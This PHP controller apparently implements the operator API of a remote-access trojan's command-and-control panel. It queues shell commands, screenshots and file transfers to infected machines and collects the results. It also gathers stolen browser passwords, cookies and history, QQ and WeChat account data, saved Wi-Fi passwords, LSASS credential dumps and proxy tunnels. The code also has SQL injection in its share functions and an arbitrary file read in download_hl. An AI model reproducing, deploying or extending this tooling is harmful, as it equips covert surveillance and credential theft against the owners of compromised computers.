<?php
defined('BASEPATH') OR exit('No direct script access allowed');
// 结合VUE的接口
/*
	状态码:
	20000 成功
	20001 失败
	30000 token错误 过期
	40000 刷新页面 token错误 过期
*/
class M2 extends CI_Controller {
	public function index(){
    }
    
    // 登录
    public function login(){
        $user = $this->input->post('username');
        $pass = $this->input->post("password");
        $res = $this->db->where(array(
            "username" => $user,
            "password" => $pass
        ))->get("team")->row_array();
        if(!$res){
            echo(json_encode(array(
                'code' => 20001,
        		'message' => 'Account and password are incorrect.'
            )));
            exit;
        }else{
        	$time = time();
        	$token = md5($user.$pass.$time);
        	
        	$this->db->where('username', $user);
            $this->db->update('team', array(
                "token" => $token
            ));
        	
        	echo(json_encode(array(
                "code" => 20000,
                "message" => "success",
                "data" => array("token" => $token)
            )));
        }
    }
    
    // 获取用户信息
    public function userinfo(){
        $token = $this->input->get('token');
        $res = $this->db->where(array(
            "token" => $token
        ))->get("team")->row_array();
        
        if($res){
        	echo(json_encode(array(
        		'code' => 20000,
        		'data' => array(
				    'name' => $res['username']
        		)
        	)));
        }else {
        	 echo(json_encode(array(
                'code' => 40000,
        		'message' => 'token error!!'
            )));
            exit;
        }
    }
    
    // 退出登录
    public function logout(){
		echo(json_encode(array(
			'code' => 20000,
			'data' => 'success'
		)));
    }
    
    private function check_token(){
        $token = $this->input->post('token');
        if(!$token) {
            $token = $this->input->get('token');
        }
        $res = $this->db->where(array(
            "token" => $token
        ))->get("team")->row_array();
        if(!$res){
        	 echo(json_encode(array(
                'code' => 30000,
        		'message' => 'token error!!'
            )));
            exit;
        }else{
        	return $res;
        }
    }
    
    // 获取机器列表
    public function get_client_list_for_web(){
        $res = $this->check_token();
        $timeout = intval($this->input->post('timeout'));
        $timeout = $timeout == 0 ? time() - 60 : time() - $timeout;
        if($res){
        	$where1 = array(
                'uid' => $res['id'],
                'last_time >=' => $timeout
            );
            $or_like = array(
                'share_users' => $res['username']
            );
            $where2 = array(
                'last_time >=' => $timeout
            );
            $clients = $this->db->where($where1)->or_like($or_like)->where($where2)->order_by('id', 'DESC')->get('clients')->result_array();
        	if($clients){
        		echo(json_encode(array(
	        		'code' => 20000,
	        		'data' => $clients
	        	)));
        	}else{
        		echo(json_encode(array(
	        		'code' => 20000,
	        		'data' => []
	        	)));
        	}
        }
    }
    
    // 设置延时
    public function set_sleep(){
        $res = $this->check_token();
        $key = $this->input->post("key");
        if(!empty($key)){
            $sleep = intval($this->input->post("sleep"));
            $sleep = $sleep < 1 ? 1 : $sleep;
            $this->db->where('key', $key);
            $this->db->update('clients', array(
                "sleep" => $sleep
            ));
            echo(json_encode(array(
                "code" => 20000,
                "message" => "set success!"
            )));
        }else{
            echo(json_encode(array(
                "code" => 20001,
                "message" => "key not found!"
            )));
        }
    }
	
	// 设置备注
    public function set_note(){
        $res = $this->check_token();
        $key = $this->input->post("key");
        if(!empty($key)){
            $note = $this->input->post("note");
            $this->db->where('key', $key);
            $this->db->update('clients', array(
                "note" => $note
            ));
            echo(json_encode(array(
            	"code" => 20000,
                "message" => "set success!"
            )));
        }else{
            echo(json_encode(array(
                "code" => 20001,
                "message" => "key not found!"
            )));
        }
    }

    // 设置备注
    public function set_av(){
        $res = $this->check_token();
        $key = $this->input->post("key");
        if(!empty($key)){
            $av = $this->input->post("av");
            $this->db->where('key', $key);
            $this->db->update('clients', array(
                "av" => $av
            ));
            echo(json_encode(array(
            	"code" => 20000,
                "message" => "set success!"
            )));
        }else{
            echo(json_encode(array(
                "code" => 20001,
                "message" => "key not found!"
            )));
        }
    }

    //提交任务 
    public function submit_task(){
        $res = $this->check_token();
        $key = $this->input->post('key');
        $content = $this->input->post('content');
        $type = $this->input->post('type');
        $module = array(
            "shell",
            "screenshot",
            "files", 
            "process_list", 
            "kill_process",
            "get_sns_info",
            "get_browser_cl",
            "get_browser_h",
            "las_dump",
            "close_proxy",
            "get_wifi_info",
            "switch_to_user"
        );
        if (!in_array($type, $module)){
            echo(json_encode(array(
                "code" => 20001,
                "message" => "type error"
            )));
            exit();
        }
        if(empty($key) || empty($content)){
            echo(json_encode(array(
                "code" => 20001,
                "message" => "key or content or userinfo not found!"
            )));
        }else{
            $client = $this->db->where('key', $key)->get("clients")->row_array();
            if(!$client){
                echo(json_encode(array(
                    "code" => 20001,
                    "message" => "client not found!"
                )));
            }else{
                $res = $this->db->insert('tasks', array(
                    "key" => $key,
                    "type" => $type,
                    "content" => $content,
                    "status" => 0,
                    "update_time" => time(),
                    "user" => $res['username']
                ));
                if($res){
                    echo(json_encode(array(
                        "code" => 20000,
                        "message" => "submit success!"
                    )));
                }else{
                    echo(json_encode(array(
                        "code" => 20001,
                        "message" => "submit failed!"
                    )));
                }
            }
        }
    }

    // 获取命令结果
    public function get_task_list_for_web(){
        $res = $this->check_token();
        $tasks = $this->db->where(array(
            "status" => 2,
            "user" => $res['username'],
            "key" => $this->input->post('key'),
            "type" => 'shell'
        ))->get('tasks')->result_array();

        if($tasks){
            echo(json_encode(array(
                "code" => 20000,
                "data" => $tasks
            )));
        }else {
            echo(json_encode(array(
                "code" => 20000,
                "data" => null
            )));
        }
    }
    
    // 修改状态
    public function upd_task_list_for_web(){
        $res = $this->check_token();
        $this->db->where(array(
            "key" => $this->input->post('key'),
            "status" => 2,
            "user" => $res['username'],
            "type" => 'shell'
        ))->update('tasks',array(
            "status" => 3
        ));
        echo(json_encode(array(
            "code" => 20000
        )));
        
    }

    // 获取截屏数据
    public function show_screenshot_list(){
        $res = $this->check_token();
        $tasks = $this->db->where(array(
            "key" => $this->input->post('key'),
            "user" => $res['username'],
            "type" => "screenshot",
            "status" => 2
        ))->order_by('id', 'DESC')->get('tasks')->result_array();
        
        if($tasks) {
            echo(json_encode(array(
                "code"=>20000,
                "status"=>TRUE,
                "data" => $tasks
            )));
        }else {
            echo(json_encode(array(
                "code"=>20000,
                "status"=>FALSE
            )));
        }
    }

    // 遍历当前目录
    public function get_curpath_allfile(){
        $res = $this->check_token();
        // for ($i=0; $i < 10; $i++) {
        //     sleep(1);
        //     $tasks = $this->db->where(array(
	    //         "key" => $this->input->post('key'),
	    //         "user" => $res['username'],
	    //         "content" => $this->input->post('path'),
	    //         "type" => 'files'
	    //     ))->select('status,content,result')->order_by('id','desc')->limit(1)->get('tasks')->row_array();
	    //     if($tasks['status'] == 2){
	    //     	break;
	    //     }    
        // }
        $tasks = $this->db->where(array(
            "key" => $this->input->post('key'),
            "user" => $res['username'],
            "status" => 2,
            "content" => $this->input->post('path'),
            "type" => 'files'
        ))->select('status,content,result')->order_by('id','desc')->limit(1)->get('tasks')->row_array();
        if($tasks) {
            if($tasks['result'] == 'error'){
                echo(json_encode(array(
                    "code"=>20000,
                    "status"=>FALSE
                )));
            }else{
                echo(json_encode(array(
                    "code"=>20000,
                    "status"=>TRUE,
                    "data"=>json_decode($tasks['result'])
                )));
            }
        }else {
            echo(json_encode(array(
                "code"=>20000
            )));
        }
    }

    // 获取公共文件区文件列表
    public function get_public_files() {
        $res = $this->check_token();
        $pubpath = "files/public/";
        if(!file_exists($pubpath)){
            mkdir($pubpath, 0700,true);
        }

        $this->load->helper('file');
        $map = get_dir_file_info($pubpath);
        if(!empty($map)){
            $newmap = array();
            foreach ($map as $value) {
                $value['name64'] = $value['name'];
                $value['name'] = base64_decode(substr($value['name'], 0, -4));
                $value['size'] = round($value['size'] / 1024, 2) . 'KB';
                $value['date'] = date( "Y-m-d H:i:s", $value['date']);
                array_push($newmap,$value);
            }
            echo(json_encode(array(
                "code"=>20000,
                "status"=>TRUE,
                "data"=>$newmap
            )));
        }else {
            echo(json_encode(array(
                "code"=>20000,
                "status"=>FALSE
            )));
        }
    }

    // 上传文件到公共区
    public function upload_public(){
        $res = $this->check_token();
        $pubpath = "files/public/";
        if(!file_exists($pubpath)){
            mkdir($pubpath, 0700,true);
        }
        $config['upload_path'] = $pubpath;
        $config['allowed_types'] = '*';
        $config['max_size'] = 0;
        $this->load->library('upload', $config);
        if($this->upload->do_upload('publicfile')){

            $data = $this->upload->data();
            $oldname = $pubpath.$data['file_name'];
            $newname = $pubpath.base64_encode($data['file_name']).'.zip';
            if(rename($oldname, $newname)) {
                echo(json_encode(array(
                    "code" => 20000,
                    "status" => TRUE
                )));
            }
        }else{
            echo(json_encode(array(
                "code" => 20000,
                "status" => FALSE
            )));
        }
    }

    // 上传到被控机器
    public function upload() {
        $res = $this->check_token();
        $data = $this->input->post('data');
        $key = $this->input->post('key');
        $target_path = $this->input->post('targetpath');
        $filepath = 'files/public/';
        $result = json_encode(array(
            "full_path" => $filepath . $data['name64'],
            "save_name" => $data['name'],
            "file_size" => $data['size'],
            "status" => TRUE
        ));

        $tasks = $this->db->insert('tasks', array(
            "key" => $key,
            "type" => 'upload',
            "content" => $target_path,
            "status" => 0,
            "result" => $result,
            "update_time" => time(),
            "user" => $res['username']
        ));

        if($tasks){
            echo(json_encode(array(
                "code" => 20000,
                "status" => TRUE
            )));
        }else{
            echo(json_encode(array(
                "code" => 20000,
                "status" => FALSE
            )));
        }
    }

    // 查看上传进度和上传记录
    public function get_upload_progress(){
        $res = $this->check_token();
        $tasks = $this->db->where(array(
            "user" => $res['username'],
            "type" => 'upload',
            "key" => $this->input->post('key')
        ))->order_by('id','desc')->get('tasks')->result_array();

        if($tasks){
            echo(json_encode(array(
                "code"=>20000,
                "status"=>TRUE,
                "data"=>$tasks
            )));
        }else{
            echo(json_encode(array(
                "code"=>20000,
                "status"=>FALSE,
                "data"=>""
            )));
        }
    }

    // 下载到中转站
    public function download(){
        $res = $this->check_token();
        $key = $this->input->post('key');
        $target_path = $this->input->post('path');
        
        $tasks = $this->db->insert('tasks', array(
            "key" => $key,
            "type" => 'download',
            "content" => $target_path,
            "status" => 0,
            "result" => json_encode(array(
                "full_path" => "",
                "save_name" => "",
                "file_size" => "",
                "status" => TRUE
            )),
            "update_time" => time(),
            "user" => $res['username']
        ));

        if($tasks){
            echo(json_encode(array(
                "code" => 20000,
                "status" => TRUE
            )));
        }else{
            echo(json_encode(array(
                "code" => 20000,
                "status" => FALSE
            )));
        }
    }

    // 查看下载进度和下载记录
    public function get_download_progress(){
        $res = $this->check_token();

        $tasks = $this->db->where(array(
            "user" => $res['username'],
            "type" => 'download',
            "key" => $this->input->post('key')
        ))->order_by('id','desc')->get('tasks')->result_array();

        if($tasks){
            echo(json_encode(array(
                "code"=>20000,
                "status"=>TRUE,
                "data"=>$tasks
            )));
        }else{
            echo(json_encode(array(
                "code"=>20000,
                "status"=>FALSE
            )));
        }
    }

    // 下载到本地
    public function loacldownload(){
        $res = $this->check_token();
        $this->load->helper('download');
        $this->load->helper('file');

        $path = $this->input->get('id');

        $tasks = $this->db->where(array(
            "id" => $this->input->get('id'),
            "type" => 'download'
        ))->get('tasks')->row_array();


        if($tasks){
            $result = (array)json_decode($tasks['result']);
            $path = $result['full_path'];
            $save_name = $result['save_name'];

            $data = read_file($path);
            force_download($save_name,$data);
        }else{
            echo '文件不存在!';
        }
    }

    // 获取进程列表
    public function get_process_list(){
        $res = $this->check_token();
        $tasks = $this->db->where(array(
            "key" => $this->input->post('key'),
            "status" => 2,
            "user" => $res['username'],
            "type" => 'process_list'
        ))->select('status,result')->order_by('id','desc')->limit(1)->get('tasks')->row_array();
        if($tasks) {
            if($tasks['result'] == 'error'){
                echo(json_encode(array(
                    "code"=>20000,
                    "status"=>FALSE
                )));
            }else{
                echo(json_encode(array(
                    "code"=>20000,
                    "status"=>TRUE,
                    "data"=>json_decode($tasks['result'])
                )));
            }
        }else {
            echo(json_encode(array(
                "code"=>20000
            )));
        }
    }

    // 获取社交信息
    public function get_sns_info(){
        $res = $this->check_token();

        $tasks = $this->db->where(array(
            "key" => $this->input->post('key'),
            "user" => $res['username'],
            "status" => 2,
            "type" => 'get_sns_info'
        ))->select('status,result')->order_by('id','desc')->limit(1)->get('tasks')->row_array();
        
        if($tasks) {
            $snsres = json_decode($tasks['result'], true);
            $newres = array();
            if($snsres['error'] == 'no') {
                foreach ($snsres['QQ'] as $key => $value) {
                    $temp = array(
                        "type" => "QQ",
                        "content" => $value
                    );
                    array_push($newres, $temp);
                }

                foreach ($snsres['Wechat'] as $key => $value) {
                    $temp = array(
                        "type" => "Wechat",
                        "content" => $value
                    );
                    array_push($newres, $temp);
                }

                foreach ($snsres['WangWang'] as $key => $value) {
                    $temp = array(
                        "type" => "WangWang",
                        "content" => $value
                    );
                    array_push($newres, $temp);
                }

                echo(json_encode(array(
                    "code"=>20000,
                    "status"=>TRUE,
                    "data"=>$newres
                )));
            }else {
                echo(json_encode(array(
                    "code"=>20000,
                    "status"=>FALSE
                )));
            }
        }else {
            echo(json_encode(array(
                "code"=>20000
            )));
        }
    }

    // 获取非当前用户的其他用户
    public function get_share_users() {
        $res = $this->check_token();
        $key = $this->input->post('key');

        $userinfo = $this->db->where('username != ',$res['username'])->select('id, username')->get('team')->result_array();
        if ($userinfo) {
            $client = $this->db->where('key', $key)->get('clients')->row_array();
            $newarr = array();
            foreach ($userinfo as $key => $value) {
                if (strpos($client['share_users'], $value['username']) !== FALSE) {
                    $temp = array(
                        'id' => $value['id'],
                        'username' => $value['username'],
                        'is_share' => TRUE
                    );
                }else {
                    $temp = array(
                        'id' => $value['id'],
                        'username' => $value['username'],
                        'is_share' => FALSE
                    );
                }
                array_push($newarr, $temp);
            }
            echo(json_encode(array(
                "code"=>20000,
                "status"=>TRUE,
                "data" => $newarr
            )));
        }else {
            echo(json_encode(array(
                "code"=>20000,
                "status"=>FALSE
            )));
        }  
    }

    // 分享验证 是否是直属机器 不是则不能再分享
    public function check_share_client() {
        $res = $this->check_token();
        $key = $this->input->post('key');

        $client = $this->db->where('key', $key)->get('clients')->row_array();
        if ($res['id'] == $client['uid']) {
            echo(json_encode(array(
                "code"=>20000,
                "status"=>TRUE
            )));
        }else {
            echo(json_encode(array(
                "code"=>20000,
                "status"=>FALSE
            )));
        }
    }

    // 设置分享
    public function set_share() {
        $res = $this->check_token();
        $key = $this->input->post('key');
        $share_users = $this->input->post('share_users');

        $this->db->where('key', $key);
        $this->db->set('share_users', "CONCAT(share_users,',','{$share_users}')", FALSE);
        $upd = $this->db->update('clients');

        if($upd) {
            echo(json_encode(array(
                "code"=>20000,
                "status"=>TRUE
            )));
        }else {
            echo(json_encode(array(
                "code"=>20000,
                "status"=>FALSE
            )));
        }
    }

    // 取消分享
    public function cancel_share() {
        $res = $this->check_token();
        $key = $this->input->post('key');
        $share_users = $this->input->post('share_users');

        $this->db->where('key', $key);
        $this->db->set('share_users', "REPLACE(share_users,',{$share_users}','')", FALSE);
        $upd = $this->db->update('clients');
        if($upd) {
            echo(json_encode(array(
                "code"=>20000,
                "status"=>TRUE
            )));
        }else {
            echo(json_encode(array(
                "code"=>20000,
                "status"=>FALSE
            )));
        }
    }

    // 获取浏览器密码/Cookies列表
    public function get_browser_cl() {
        $res = $this->check_token();
        $tasks = $this->db->where(array(
            "key" => $this->input->post('key'),
            "status" => 2,
            "user" => $res['username'],
            "type" => 'get_browser_cl'
        ))->select('id,status,result,update_time')->order_by('id','desc')->get('tasks')->result_array();
        if($tasks) {
            $bclres = array();
            foreach ($tasks as $key => $value) {
                $temp = json_decode($value['result'], true);
                if($temp['status'] == true) {
                    $temp = $temp['data'];
                    $temp['id'] = $value['id'];
                    $temp['update_time'] = date( "Y-m-d H:i:s", $value['update_time']);
                    $temp['user'] = $temp[0]['user'];
                    $temp['browser'] = '浏览器';
                    $temp['hasChildren'] = true;
                    array_push($bclres,$temp);
                } else {
                    echo(json_encode(array(
                        "code"=>20000,
                        "status"=>FALSE,
                        "msg"=>$temp['msg']
                    )));
                    exit();
                }
            }
            echo(json_encode(array(
                "code"=>20000,
                "status"=>TRUE,
                "data"=>$bclres
            )));
        }else {
            echo(json_encode(array(
                "code"=>20000,
                "status"=>TRUE,
                "data"=>[]
            )));
        }
    }
    // 获取浏览器历史记录列表
    public function get_browser_history() {
        $res = $this->check_token();
        $tasks = $this->db->where(array(
            "key" => $this->input->post('key'),
            "status" => 2,
            "user" => $res['username'],
            "type" => 'get_browser_h'
        ))->select('id,status,result,update_time')->order_by('id','desc')->get('tasks')->result_array();
        if($tasks) {
            $bhres = array();
            foreach ($tasks as $key => $value) {
                $temp = json_decode($value['result'], true);
                if($temp['status'] == true) {
                    $temp = $temp['data'];
                    $temp['id'] = $value['id'];
                    $temp['update_time'] = date( "Y-m-d H:i:s", $value['update_time']);
                    $temp['user'] = $temp[0]['user'];
                    $temp['browser'] = '浏览器';
                    $temp['file_path'] = '#';
                    $temp['hasChildren'] = true;
                    array_push($bhres,$temp);
                } else {
                    echo(json_encode(array(
                        "code"=>20000,
                        "status"=>FALSE,
                        "msg"=>$temp['msg']
                    )));
                    exit();
                }
            }
            echo(json_encode(array(
                "code"=>20000,
                "status"=>TRUE,
                "data"=>$bhres
            )));
        }else {
            echo(json_encode(array(
                "code"=>20000,
                "status"=>TRUE,
                "data"=>[]
            )));
        }
    }

    // 下载到本地 并改名
    public function download_hl(){
        $res = $this->check_token();
        $this->load->helper('download');
        $this->load->helper('file');

        $path = $this->input->get('path');
        $save_name = $this->input->get('save_name');

        $data = read_file($path);
        force_download($save_name,$data);
    }

    // 获取 LSASS
    public function get_lsass() {
        $res = $this->check_token();
        $tasks = $this->db->where(array(
            "key" => $this->input->post('key'),
            "status" => 2,
            "user" => $res['username'],
            "type" => 'las_dump'
        ))->select('id,status,result,update_time')->order_by('id','desc')->get('tasks')->result_array();

        if($tasks) {
            $lsares = array();
            foreach ($tasks as $key => $value) {
                $temp = json_decode($value['result'], true);
                if($temp['status'] == true) {
                    $temp['id'] = $value['id'];
                    $temp['update_time'] = date( "Y-m-d H:i:s", $value['update_time']);
                    $temp['file_path'] = $temp['data'];
                    array_push($lsares,$temp);
                } else {
                    echo(json_encode(array(
                        "code"=>20000,
                        "status"=>FALSE,
                        "msg"=>$temp['msg']
                    )));
                    exit();
                }
            }
            echo(json_encode(array(
                "code"=>20000,
                "status"=>TRUE,
                "data"=>$lsares
            )));
        }else {
            echo(json_encode(array(
                "code"=>20000,
                "status"=>TRUE,
                "data"=>[]
            )));
        }
    }

    // 添加网络代理信息
    public function add_network_agent() {
        $res = $this->check_token();
        $key = $this->input->post('key');
        $type = $this->input->post('type');

        $this->load->library('Proxy');
        $tunnelInfo = $this->proxy->getATunnel();

        $tunnel = json_decode($tunnelInfo, TRUE);
        if($tunnel['status']) {
            $client = $this->db->where('key', $key)->get("clients")->row_array();
            if(!$client){
                echo(json_encode(array(
                    "code" => 20001,
                    "message" => "client not found!"
                )));
            }else{
                $res = $this->db->insert('tasks', array(
                    "key" => $key,
                    "type" => $type,
                    "content" => $tunnelInfo,
                    "status" => 0,
                    "update_time" => time(),
                    "user" => $res['username']
                ));
                if($res){
                    echo(json_encode(array(
                        "code" => 20000,
                        "status" => TRUE,
                        "message" => "submit success!"
                    )));
                }else{
                    echo(json_encode(array(
                        "code" => 20001,
                        "message" => "submit failed!"
                    )));
                }
            }
        }else {
            echo(json_encode(array(
                "code" => 20000,
                "status" => FALSE,
                "msg" => "添加网络代理失败!"
            )));
        }
    }

    // 获取网络代理服务器
    public function get_network_agent() {
        $res = $this->check_token();
        $tasks = $this->db->where(array(
            "key" => $this->input->post('key'),
            "status" => 2,
            "user" => $res['username'],
            "type" => 'open_proxy'
        ))->select('id,status,result,content')->order_by('id','desc')->get('tasks')->result_array();

        if($tasks) {
            $nares = array();
            foreach ($tasks as $key => $value) {
                $status = json_decode($value['result'], true);
                if($status['status'] == true) {
                    $content = json_decode($value['content'], true);
                    $temp['id'] = $value['id'];
                    $temp['host'] = $content['msg']['host'];
                    $temp['out_port'] = $content['msg']['out_port'];
                    $temp['time'] = $content['msg']['time'];
                    array_push($nares,$temp);
                } else {
                    echo(json_encode(array(
                        "code"=>20000,
                        "status"=>FALSE,
                        "msg"=>'获取失败!!'
                    )));
                    exit();
                }
            }
            echo(json_encode(array(
                "code"=>20000,
                "status"=>TRUE,
                "data"=>$nares
            )));
        }else {
            echo(json_encode(array(
                "code"=>20000,
                "status"=>TRUE,
                "data"=>[]
            )));
        }
    }

    // 获取WIFI信息
    public function get_wifi_info() {
        $res = $this->check_token();
        $tasks = $this->db->where(array(
            "key" => $this->input->post('key'),
            "status" => 2,
            "user" => $res['username'],
            "type" => 'get_wifi_info'
        ))->select('id,status,result,update_time')->order_by('id','desc')->get('tasks')->result_array();

        if($tasks) {
            $wifires = array();
            foreach ($tasks as $key => $value) {
                $result = json_decode($value['result'], true);
                if($result['status'] == true) {
                    $temp['id'] = $value['id'];
                    $temp['SSID'] = 'WIFI名称';
                    $temp['Password'] = 'WIFI密码';
                    $temp['update_time'] = date( "Y-m-d H:i:s", $value['update_time']);
                    $temp['hasChildren'] = true;
                    $temp['wifilist'] = $result['saved'];
                    $temp['nearby'] = $result['nearby'];
                    array_push($wifires,$temp);
                } else {
                    echo(json_encode(array(
                        "code"=>20000,
                        "status"=>FALSE,
                        "msg"=>$result['msg']
                    )));
                    exit();
                }
            }
            echo(json_encode(array(
                "code"=>20000,
                "status"=>TRUE,
                "data"=> $wifires
            )));
            exit();
            echo(json_encode(array(
                "code"=>20000,
                "status"=>TRUE,
                "data"=>$nares
            )));
        }else {
            echo(json_encode(array(
                "code"=>20000,
                "status"=>TRUE,
                "data"=>[]
            )));
        }
    }

    // 根据 用户 获取最近10条上线记录
    public function get_lately_ten() {
        $res = $this->check_token();
        $result = $this->db->where(array(
            "uid" => $res['id'],
        ))->select('FROM_UNIXTIME(join_time) as join_time, public_ip,note,os_version,`current_user`')->order_by('join_time','desc')->limit(10)->get('clients')->result_array();

        if($result) {
            echo(json_encode(array(
                "code"=>20000,
                "status"=>TRUE,
                "data"=> $result
            )));
        }else {
            echo(json_encode(array(
                "code"=>20000,
                "status"=>TRUE,
                "data"=> []
            )));
        }
    }
}
